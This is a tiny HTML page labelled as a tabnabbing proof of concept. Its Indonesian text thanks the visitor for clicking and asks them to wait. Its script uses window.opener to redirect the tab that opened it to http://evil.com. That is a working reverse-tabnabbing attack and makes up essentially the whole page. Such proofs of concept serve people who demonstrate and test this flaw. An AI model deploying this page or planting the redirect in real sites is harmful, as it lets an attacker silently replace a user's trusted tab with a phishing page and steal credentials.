<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tabnabbing POC</title>
</head>
<body>
  <h1>Terima kasih sudah klik link ini 😈</h1>
  <p>Mohon tunggu sebentar...</p>

  <script>
    if (window.opener) {
      window.opener.location = "http://evil.com"; 
    }
  </script>
</body>
</html>
